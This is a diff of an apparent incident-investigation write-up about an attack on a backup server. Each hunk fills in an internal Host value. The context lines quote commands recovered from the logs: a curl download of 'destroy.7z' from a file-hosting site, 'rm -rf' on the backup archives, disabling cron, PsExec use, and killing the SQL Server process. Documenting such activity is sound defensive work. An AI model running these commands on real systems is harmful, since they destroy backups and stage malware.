@@ -258,7 +258,7 @@ ls --color=auto -la /backups/
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-25T05:47:51.749736Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -300,7 +300,7 @@ find /backups -name *.tar.gz
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-24T14:16:06.546964Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -342,7 +342,7 @@ DeviceProcessEvents
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-24T14:16:08.673485Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -383,7 +383,7 @@ cat /etc/crontab
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | <Placeholder> |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -425,7 +425,7 @@ curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | <Placeholder> |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -509,7 +509,7 @@ rm -rf /backups/archives
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-25T05:47:02.660493Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -571,7 +571,7 @@ systemctl stop cron
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-25T05:47:03.659261Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -615,7 +615,7 @@ systemctl disable cron
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-25T05:47:03.679621Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -668,7 +668,7 @@ PsExec64.exe
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-25T06:03:47.900164Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -711,7 +711,7 @@ DeviceProcessEvents
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-25T06:03:47.900164Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -753,7 +753,7 @@ silentlynx.exe
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-25T06:03:47.900164Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -794,7 +794,7 @@ DeviceProcessEvents
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-25T06:04:53.2550438Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -837,7 +837,7 @@ DeviceProcessEvents
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-25T06:04:54.0244502Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -880,7 +880,7 @@ taskkill /F /IM sqlservr.exe
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-25T06:07:07.0199729Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
@@ -923,7 +923,7 @@ DeviceProcessEvents
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
+| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
 | Timestamp | 2025-11-25T06:07:08.2198577Z |
 | Process | <Placeholder> |
 | Parent Process | <Placeholder> |
